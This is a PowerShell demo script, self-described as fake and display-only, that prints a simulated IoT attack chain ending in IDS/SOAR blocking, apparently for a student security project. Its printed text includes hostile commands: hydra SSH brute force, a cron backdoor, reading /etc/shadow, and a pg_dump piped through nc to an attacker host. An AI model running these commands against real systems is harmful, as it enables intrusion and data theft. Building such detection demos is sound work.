# DEMO ATTACK SIMULATOR - Windows PowerShell
# FAKE / DISPLAY ONLY - No actual network traffic generated

$TARGET_IP = "192.168.1.43"
$CAMERA_IP = "192.168.50.10"
$BYOD_IP   = "192.168.50.40"
$ATTACKER  = "10.0.0.77"

function Red    { param($t) Write-Host $t -ForegroundColor Red }
function Green  { param($t) Write-Host $t -ForegroundColor Green }
function Yellow { param($t) Write-Host $t -ForegroundColor Yellow }
function Cyan   { param($t) Write-Host $t -ForegroundColor Cyan }
function White  { param($t) Write-Host $t -ForegroundColor White }
function Gray   { param($t) Write-Host $t -ForegroundColor DarkGray }

function Pause-Rand {
    param($a=300, $b=500)
    Start-Sleep -Milliseconds (Get-Random -Minimum $a -Maximum $b)
}

function Print-Banner {
    Clear-Host
    $Host.UI.RawUI.WindowTitle = "Attack Terminal"
    Red  ""
    Red  "  @@@@@@  @@@@@@ @@@@@@@   @@     @@      @@@@@  @@@@@  "
    Red  "  @@  @@  @@  @@ @@       @@@@   @@@@    @@  @@ @@  @@  "
    Red  "  @@ @@@  @@@@@@ @@@@@   @@  @@ @@  @@   @@@@@@ @@@@@   "
    Red  "  @@@ @@  @@  @@ @@      @@@@@@  @@@@@@  @@  @@ @@  @@  "
    Red  "  @@  @@  @@  @@ @@@@@@@  @@  @@ @@  @@  @@  @@ @@  @@  "
    Write-Host ""
    Gray "         Offensive Security Research Framework v4.2.1"
    Gray "         Author: r00tk1t  |  Target: IoT Network Segment"
    Write-Host ""
    Yellow "  [!] INITIATING ATTACK SEQUENCE AGAINST IoT INFRASTRUCTURE"
    Gray   "  ---------------------------------------------------------"
    Write-Host ""
    Start-Sleep -Milliseconds 1500
}

function Phase-Recon {
    Write-Host ""
    Cyan   "======================================================"
    Cyan   "  PHASE 1 - RECONNAISSANCE AND NETWORK DISCOVERY"
    Cyan   "======================================================"
    Start-Sleep -Milliseconds 600

    White  ""
    White  "  nmap -sn 192.168.1.0/24 --min-rate 1000"
    Pause-Rand 700 1000
    Green  "  Starting Nmap 7.94 at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Pause-Rand 300 400

    $hosts = @("192.168.1.1", $TARGET_IP, $CAMERA_IP, $BYOD_IP)
    foreach ($h in $hosts) {
        Pause-Rand 200 350
        Write-Host "  Nmap scan report for $h"
        $lat = Get-Random -Minimum 10 -Maximum 50
        Green "  Host is up (0.00${lat}s latency)."
    }

    Pause-Rand 400 600
    Yellow "  Nmap done: 256 IP addresses scanned - 4 hosts up - 2.31s"
    Write-Host ""
    Start-Sleep -Milliseconds 800

    White  "  nmap -sV -sS -p- --open $TARGET_IP -T4"
    Pause-Rand 1000 1400
    Green  "  Starting aggressive scan on $TARGET_IP ..."
    Pause-Rand 300 500

    $ports = @(
        "  22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu",
        "  80/tcp    open  http          nginx 1.22.0",
        "  443/tcp   open  https         nginx 1.22.0",
        "  1883/tcp  open  mqtt          Mosquitto MQTT 2.0.15",
        "  5432/tcp  open  postgresql    PostgreSQL 14.5",
        "  8000/tcp  open  http-alt      uvicorn FastAPI 0.95",
        "  9090/tcp  open  http          Prometheus 2.40.0"
    )
    foreach ($p in $ports) {
        Pause-Rand 280 420
        Green $p
    }

    Write-Host ""
    Yellow "  [+] Service detection complete. 7 open ports identified."
    Red    "  [!] VULNERABLE: Port 1883 - MQTT broker, NO authentication"
    Red    "  [!] VULNERABLE: Port 8000 - FastAPI REST, no auth token"
    Write-Host ""
    Start-Sleep -Milliseconds 1500
}

function Phase-IoTScan {
    Write-Host ""
    Cyan   "======================================================"
    Cyan   "  PHASE 2 - IoT DEVICE FINGERPRINTING"
    Cyan   "======================================================"
    Start-Sleep -Milliseconds 600

    White  ""
    White  "  nmap -sV -p 554,8080,80 $CAMERA_IP --script rtsp-url-brute"
    Pause-Rand 900 1200
    Yellow "  Scanning IP Camera at $CAMERA_IP ..."
    Pause-Rand 400 600
    Green  "  554/tcp  open  rtsp   Live555 RTSP server 0.94"
    Green  "  80/tcp   open  http   Hikvision DS-2CD2143G2 webserver"
    Pause-Rand 300 400
    Yellow "    rtsp-url-brute results:"
    Yellow "      rtsp://${CAMERA_IP}:554/stream1  ->  SUCCESS (no auth!)"
    Yellow "      rtsp://${CAMERA_IP}:554/ch01/sub  ->  SUCCESS"
    Red    "    CRITICAL: Unauthenticated RTSP streams accessible!"
    Write-Host ""
    Start-Sleep -Milliseconds 800

    White  "  nmap -sV -p 23,22,8080 $BYOD_IP"
    Pause-Rand 900 1200
    Yellow "  Scanning BYOD Mobile at $BYOD_IP ..."
    Pause-Rand 400 600
    Green  "  23/tcp   open  telnet  Android Debug Bridge ADB v1.0.41"
    Red    "  [!] ADB over network ENABLED - full device access possible"
    Write-Host ""
    Start-Sleep -Milliseconds 1500
}

function Phase-CameraExploit {
    Write-Host ""
    Cyan   "======================================================"
    Cyan   "  PHASE 3 - EXPLOITING IP CAMERA (RTSP HIJACK)"
    Cyan   "======================================================"
    Start-Sleep -Milliseconds 600

    White  ""
    White  "  python3 exploit/rtsp_hijack.py --target $CAMERA_IP --port 554"
    Pause-Rand 700 900
    Yellow "  [*] Connecting to rtsp://${CAMERA_IP}:554/stream1 ..."
    Pause-Rand 500 700
    Green  "  [+] Connected! Unauthenticated stream captured."
    Pause-Rand 300 400
    Yellow "  [*] Crafting malformed DESCRIBE request CVE-2021-36260 ..."
    Start-Sleep -Milliseconds 700

    for ($i = 1; $i -le 8; $i++) {
        Pause-Rand 220 320
        $bar = ("X" * $i) + ("-" * (8 - $i))
        $pct = $i * 12
        $msg = "  [>] Payload chunk $i/8  [$bar]  $pct%"
        Write-Host $msg -ForegroundColor Red
    }

    Pause-Rand 400 600
    Red    "  [!] BUFFER OVERFLOW TRIGGERED - Remote Code Execution achieved!"
    Pause-Rand 300 400
    Green  "  [+] Reverse shell received from $CAMERA_IP"
    Green  "  [+] id: uid=0(root) gid=0(root)"
    Green  "  [+] Camera firmware: v5.5.800 build 210628"
    Write-Host ""
    Start-Sleep -Milliseconds 1500
}

function Phase-MqttFlood {
    Write-Host ""
    Cyan   "======================================================"
    Cyan   "  PHASE 4 - MQTT BROKER FLOOD ATTACK"
    Cyan   "======================================================"
    Start-Sleep -Milliseconds 600

    White  ""
    White  "  python3 exploit/mqtt_flood.py --broker $TARGET_IP --port 1883 --rate 5000"
    Pause-Rand 700 900
    Yellow "  [*] Connecting to MQTT broker ${TARGET_IP}:1883 ..."
    Pause-Rand 400 600
    Green  "  [+] Connected - anonymous access granted (no credentials required!)"
    Pause-Rand 300 400
    Yellow "  [*] Launching flood: 5000 messages/sec across all topics"
    Pause-Rand 300 400

    $total = 0
    for ($i = 0; $i -lt 12; $i++) {
        $msgs  = Get-Random -Minimum 4700 -Maximum 5300
        $total += $msgs
        $cpu   = Get-Random -Minimum 55 -Maximum 97
        $queue = Get-Random -Minimum 6  -Maximum 28
        Pause-Rand 350 450
        $line = "  [>] Sent: $total msgs  |  Broker CPU: $cpu%  |  Queue: $queue"
        Write-Host "`r$line" -NoNewline -ForegroundColor Red
    }

    Write-Host ""
    Pause-Rand 400 500
    Red    "  [!] Broker queue SATURATED - $total messages injected"
    Yellow "  [*] IoT sensors losing connection due to broker overload ..."
    Yellow "  [*] Packet loss: 34% on 192.168.1.0/24"
    Write-Host ""
    Start-Sleep -Milliseconds 1500
}

function Phase-SshBrute {
    Write-Host ""
    Cyan   "======================================================"
    Cyan   "  PHASE 5 - SSH BRUTE FORCE (BACKEND SERVER)"
    Cyan   "======================================================"
    Start-Sleep -Milliseconds 600

    White  ""
    White  "  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP -t 4"
    Pause-Rand 900 1200
    Yellow "  [*] Hydra v9.4 - attacking ${TARGET_IP}:22 ..."
    Pause-Rand 300 400

    $pwds = @("123456","password","admin","root123","toor","qwerty","letmein","abc123","master","hello123")
    $i = 0
    foreach ($pwd in $pwds) {
        Pause-Rand 300 450
        if ($pwd -eq "master") {
            Write-Host "  [ATTEMPT $i]  root:$pwd  ->  " -NoNewline -ForegroundColor White
            Green "SUCCESS!"
        } else {
            Gray "  [ATTEMPT $i]  root:$pwd  ->  FAILED"
        }
        $i++
    }

    Write-Host ""
    Pause-Rand 400 500
    Green  "  [+] VALID CREDENTIAL FOUND  ->  root:master"
    Red    "  [!] SSH access to $TARGET_IP COMPROMISED"
    Write-Host ""
    Start-Sleep -Milliseconds 1500
}

function Phase-C2 {
    Write-Host ""
    Cyan   "======================================================"
    Cyan   "  PHASE 6 - C2 ESTABLISHMENT AND DATA EXFILTRATION"
    Cyan   "======================================================"
    Start-Sleep -Milliseconds 600

    White  ""
    White  "  ssh root@$TARGET_IP -i id_rsa"
    Pause-Rand 800 1000
    Green  "  [+] Connected to $TARGET_IP"
    Pause-Rand 300 400

    White  "  root@backend-pc:~# whoami"
    Pause-Rand 300 400
    Green  "  root"

    White  "  root@backend-pc:~# id"
    Pause-Rand 300 400
    Green  "  uid=0(root) gid=0(root) groups=0(root)"
    Pause-Rand 300 400

    White  "  root@backend-pc:~# uname -a"
    Pause-Rand 300 400
    Green  "  Linux backend-pc 5.15.0-91-generic x86_64 GNU/Linux"
    Pause-Rand 400 500

    White  "  root@backend-pc:~# echo backdoor >> /etc/crontab"
    Pause-Rand 300 400
    Green  "  [+] Persistence backdoor installed via cron"
    Pause-Rand 300 400

    White  "  root@backend-pc:~# cat /etc/shadow"
    Pause-Rand 500 700
    Red    '  root:$6$xyz$3nHp1R4kLm8Qw2Vy7ZtBnFcXsJdKeUoAhWiGpMqEl0T:19234:0:99999:7:::'
    Red    '  ubuntu:$6$abc$7mKs9P2nWx5Rv3Uy8ZtCnFdXtKeLpAhWiGqMrEl0S:19234:0:99999:7:::'
    Yellow "  [*] Password hashes captured - cracking offline ..."
    Pause-Rand 400 500

    White  "  root@backend-pc:~# pg_dump fyp_security | nc $ATTACKER 8443"
    Pause-Rand 300 400
    Yellow "  [*] Starting database exfiltration to ${ATTACKER}:8443 ..."
    Write-Host ""

    for ($i = 1; $i -le 5; $i++) {
        Pause-Rand 350 500
        $pct  = $i * 20
        $mb   = [math]::Round($i * 9.4, 1)
        $done = "=" * ($i * 4)
        $left = "-" * (20 - $i * 4)
        $msg  = "  [>>] Exfiltrating [$done$left] $pct%  ($mb MB sent)"
        Write-Host $msg -ForegroundColor Red
    }

    Write-Host ""
    Pause-Rand 400 500
    Red    "  [!] EXFILTRATION COMPLETE - 47.2 MB transferred to $ATTACKER"
    Green  "  [+] Database fyp_security fully compromised"
    Write-Host ""
    Start-Sleep -Milliseconds 1500
}

function Phase-SoarBlock {
    Write-Host ""
    Cyan   "======================================================"
    Cyan   "  PHASE 7 - LATERAL MOVEMENT (IDS DETECTION)"
    Cyan   "======================================================"
    Start-Sleep -Milliseconds 600

    White  ""
    White  "  arp-scan --interface=eth0 192.168.50.0/24"
    Pause-Rand 700 900
    Yellow "  [*] Scanning IoT subnet 192.168.50.0/24 ..."
    Pause-Rand 500 700

    Write-Host ""
    Write-Host "  +--------------------------------------------------+" -ForegroundColor Red
    Write-Host "  |  WARNING: IDS ALERT - ANOMALY DETECTED           |" -ForegroundColor Red
    Write-Host "  |  Risk Score: 0.97  |  Severity: CRITICAL         |" -ForegroundColor Red
    Write-Host "  +--------------------------------------------------+" -ForegroundColor Red
    Write-Host ""
    Pause-Rand 300 400

    Red    "  [!] SOAR playbook block_attacker EXECUTED"
    Red    "  [!] UFW rule added: deny from $ATTACKER to any"
    Pause-Rand 300 400
    Red    "  [!] SOAR playbook camera_defense EXECUTED"
    Red    "  [!] Rate-limit applied on ${CAMERA_IP}:554"
    Pause-Rand 300 400
    Red    "  [!] SOAR playbook scan_detection LOGGED"
    Red    "  [!] Analyst dashboard notified"
    Write-Host ""
    Start-Sleep -Milliseconds 800

    White  "  ssh -p 2222 root@$TARGET_IP"
    Pause-Rand 700 900
    Red    "  ssh: connect to host $TARGET_IP port 2222: Connection refused"
    Pause-Rand 300 400

    White  "  proxychains nmap -sS $TARGET_IP"
    Pause-Rand 800 1000
    Red    "  [!] BLOCKED by IDS firewall - all packets dropped"
    Red    "  [!] Connection timeout - attacker IP blacklisted"
    Write-Host ""
    Start-Sleep -Milliseconds 1000
}

function Print-Summary {
    Write-Host ""
    Gray   "  ======================================================"
    Yellow "  ATTACK CHAIN SUMMARY"
    Gray   "  ======================================================"
    Write-Host ""
    Green  "  [OK]  Network recon - 4 hosts, 7 ports discovered"
    Green  "  [OK]  IP Camera $CAMERA_IP - RTSP hijack CVE-2021-36260"
    Green  "  [OK]  MQTT broker - flood attack 60000+ msgs injected"
    Green  "  [OK]  SSH brute force - credential found: root:master"
    Green  "  [OK]  C2 persistence - cron backdoor installed"
    Green  "  [OK]  Data exfiltration - 47.2 MB (fyp_security DB)"
    Red    "  [XX]  Lateral movement - BLOCKED by IDS/SOAR system"
    Write-Host ""
    Write-Host "  +--------------------------------------------------+" -ForegroundColor Red
    Write-Host "  |  IDS SYSTEM DETECTED AND BLOCKED THE FINAL STAGE |" -ForegroundColor Red
    Write-Host "  |  All activity logged to SIEM - Analyst alerted   |" -ForegroundColor Red
    Write-Host "  +--------------------------------------------------+" -ForegroundColor Red
    Write-Host ""
    Gray   "  ======================================================"
    Write-Host ""
}

# ── MAIN ──────────────────────────────────────────────────────
Print-Banner
Phase-Recon
Phase-IoTScan
Phase-CameraExploit
Phase-MqttFlood
Phase-SshBrute
Phase-C2
Phase-SoarBlock
Print-Summary
